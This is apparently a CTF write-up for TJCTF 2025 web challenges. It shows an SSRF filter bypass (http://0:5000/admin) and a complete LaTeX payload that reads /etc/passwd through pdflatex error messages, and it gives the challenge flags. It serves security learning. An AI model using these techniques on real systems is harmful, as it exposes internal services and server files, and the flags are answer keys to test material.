------------------

### CTF-: TJCTF 2025

------------------

- Web-:
  - Loopy
  - Texploit
  - Chilly-site

------------------

### Loopy

------------------

![image](https://github.com/user-attachments/assets/faccb1a6-72ec-437d-bbd7-8135c2400c9f)

------------------

- The website allows users to preview site which fits a Server Side Request Forgery scenario.

![image](https://github.com/user-attachments/assets/94cfbb3c-81d6-4518-a156-996930936ce9)

- The challenge description gave a hint to load a service at port `5000`.I tried to load it with `localhost:5000` and it  didn't work.Oops, it looks like the site has a long list of filters for the service.

![image](https://github.com/user-attachments/assets/be0b14a8-cfa0-4cc5-8ff4-9c6ee91393ae)

- You can try simple ssrf bypass tricks by using a redirect or just look another represntation of localhost which worked for me. Bypass-: ```http://0:5000/admin```.

![image](https://github.com/user-attachments/assets/82997e35-23b5-4a92-8f30-8f63bb633633)

- Flag-:```tjctf{i_l0v3_ssssSsrF_9o4a8}```

--------------------

### Texploit

--------------------

![image](https://github.com/user-attachments/assets/1774ea97-8ba2-4693-925a-f6d5e5022131)

---------------------

- The site is a latex compiler that compiles latex code into pdf.I tried the basic latex payload like `/input` and it didn't work.

![image](https://github.com/user-attachments/assets/7569e4ab-17d3-417f-a4f8-120f4b69350f)

-  After google searching for sometime,I got this payload from a [ctf writeup](https://hackmd.io/@toxicpie9/By154DFe9) that allows us to read files by triggering an error. The main idea is that `pdflatex` prints errors to stdout in a special format, so we can do something like \typeout{! abc} to trick the bot into thinking that abc is an error.Payload-:

```pdflatex
\catcode0=10  % make \0 not produce a syntax error
\catcode9=11  % make \t indents work correctly

\def\n{/etc/passwd}
\def\l{0}
\def\r{420}

\newread\file
\openin\file=\n

\newcounter{line}
\makeatletter
\@whilenum\value{line} < \r \do {
    \read\file to \fileline
    \stepcounter{line}
    \ifnum\value{line} > \l
        \typeout{! \fileline}
    \fi
}
```

- The payload above will read 420 chars in the `/etc/passwd` file.

![image](https://github.com/user-attachments/assets/ba14032a-7c87-400c-a9b0-6e4a7f1c361d)

- Flag-: ```tjctf{f1l3_i0_1n_l4t3x?} ```

![image](https://github.com/user-attachments/assets/4800df94-9e44-41f6-8c2b-7ad982f4338d)


--------------------

### Chill-site

--------------------

